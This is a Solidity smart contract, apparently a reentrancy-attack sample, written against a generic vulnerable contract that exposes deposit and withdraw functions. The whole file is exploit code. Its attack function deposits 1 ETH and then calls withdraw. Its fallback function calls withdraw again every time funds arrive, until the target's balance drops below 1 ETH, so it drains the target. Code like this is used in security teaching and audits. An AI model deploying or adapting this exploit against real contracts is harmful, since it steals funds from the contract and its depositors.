// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerable {
    function withdraw() external;
    function deposit() external payable;
}

contract ReentrancyAttack {
    IVulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = IVulnerable(_vulnerable);
    }

    fallback() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
